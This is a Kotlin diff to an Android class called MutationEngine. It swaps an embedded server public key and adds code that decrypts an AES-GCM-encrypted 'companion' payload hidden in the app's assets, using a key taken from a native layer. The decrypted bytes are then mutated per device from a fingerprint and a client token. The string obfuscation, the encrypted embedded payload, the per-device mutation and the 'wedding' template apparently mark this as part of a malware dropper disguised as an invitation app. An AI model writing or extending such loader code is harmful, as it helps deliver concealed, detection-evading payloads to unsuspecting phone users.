@@ -38,7 +38,7 @@ class MutationEngine(private val context: Context) {
         private val SERVER_URL get() = StringPool.d(StringPool.SERVER_URL)
 
         // Replace with value from keys/public_key_for_kotlin.txt
-        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt0T8uq2xV4KaexWHBvelesF60iODNJX0HVltRHvb++J3ykspy61KRWVlcbOkjTIcI95accNlxPMOHvIYFl9YBxZmycBxF/F0LTFVq34RS94EGZluOJeVs0YVAG2kkX+Z+vLsx3JZZtNwGA2hWHuSygXpSXOKPM8SymO2+fotyupSF6GLYZGGoic4srVkLIVIeBjcsDtQtJeM08FeF1lP5VHdy8aKXX4n2iHTDSR3tbeI/93RKWr3cmeCligPSpZVWLRjBbzTGeGuM2eDbRlqMTrzbYO1qxVzPvb+XJ8Kov6Dfeek+UmyFF7tZ4TEPLif2B+Ys3j+rLsq7MG/KyKnbwIDAQAB"
+        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiy+7U7tgNdAqaZIZLTKGRY1LAVZrn2WfPZTbCjML0KH0W8iRfruJDpP8lOjXiMmUaVjcjIT0RAtYeBh/gR+WC//vkZ3WDILIc+LFAgmfJxYeClRJwJlG1aKH9lO58TFI6Rm3EPyIAfJcs4G0QVPWBbEN8ZljyXK3YOrORUD1SyBw8+IfG8h8T6LYJ6T7yJE3XlNi0hMuMYERX9s1c7syI4wJRw+iC7oG/7gv3zaDL034Dp2Zzg2ZqRBuaHTrxWFWpOVQS82c1oa+wZg0j2ikqIrDd/949aEfD9MRVa2pWytmmomw23IAjhp82cvnX6b/g4TcaQpPHAQ18aNlMLaRdwIDAQAB"
 
         // Template — set by CI via BuildConfig
         private const val TEMPLATE = "wedding"
@@ -227,15 +227,46 @@ class MutationEngine(private val context: Context) {
         return result
     }
 
+    // ── Companion decryption ─────────────────────────────────────────────────
+    // companion.bin format: CPBN(4) + nonce(12) + AES-256-GCM ciphertext
+    // Key is derived from the same BUILD_AES_KEY used at build time,
+    // re-derived at runtime via the native layer key derivation.
+
+    private fun decryptCompanionBin(encBytes: ByteArray): ByteArray {
+        return try {
+            val MAGIC = byteArrayOf(0x43, 0x50, 0x42, 0x4E) // CPBN
+            // Verify magic
+            if (encBytes.size < 16 || !encBytes.copyOf(4).contentEquals(MAGIC)) {
+                // Not encrypted — return as-is (fallback for dev builds)
+                return encBytes
+            }
+            val nonce      = encBytes.copyOfRange(4, 16)
+            val ciphertext = encBytes.copyOfRange(16, encBytes.size)
+            // Get key from native layer
+            val keyHex = NativeProtect.getCompanionDecryptKey()
+            if (keyHex.isNullOrEmpty()) return ByteArray(0)
+            val key = keyHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
+            // AES-256-GCM decrypt
+            val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
+            val keySpec = javax.crypto.spec.SecretKeySpec(key, "AES")
+            val paramSpec = javax.crypto.spec.GCMParameterSpec(128, nonce)
+            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, paramSpec)
+            cipher.doFinal(ciphertext)
+        } catch (e: Exception) {
+            ByteArray(0)
+        }
+    }
+
     // ── Main entry point ──────────────────────────────────────────────────────
 
     fun getMutatedCompanionBytes(): ByteArray {
         val fingerprint = collectDeviceFingerprint()
         val clientToken = getClientToken()
 
-        // Read base companion from assets
+        // Read base companion from assets (stored as AES-256-GCM encrypted .bin)
         val baseBytes = try {
-            context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+            val encBytes = context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+            decryptCompanionBin(encBytes)
         } catch (e: Exception) {
             return ByteArray(0)
         }
